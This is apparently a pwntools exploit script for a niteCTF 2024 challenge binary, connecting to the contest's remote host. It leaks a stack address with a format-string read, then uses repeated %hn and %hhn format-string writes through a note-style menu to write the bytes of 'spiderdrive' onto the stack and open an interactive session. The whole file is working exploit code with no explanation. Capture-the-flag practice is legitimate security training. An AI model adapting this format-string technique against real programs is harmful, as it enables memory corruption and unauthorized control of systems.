from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chaterine.chals.nitectf2024.live", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+174
b *main+902
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def new(ind, size):
    sla(">>", "1")
    sla("index:", str(ind))
    sla("size:", str(size))

def write(ind, data):
    sla(">>", "3")
    sla("index:", str(ind))
    sl(data)

sl(b'%19$p')
ru("Hello ")
leak = int(rl(), 16)
stack = (leak & 0xffff) - 0x148

new(0, 1000)
write(0, f'%{stack}c%19$hn')

j = 0
string = b'spiderdrive'
for i in range(0, len(string)):
    print(i)
    new(i+1, 1000)
    write(i+1, f'%{string[i]}c%49$hhn')
    j += 1
    write(i+1, f'%{stack+j}c%19$hn')

sla(b'>>', b'4')



io.interactive()
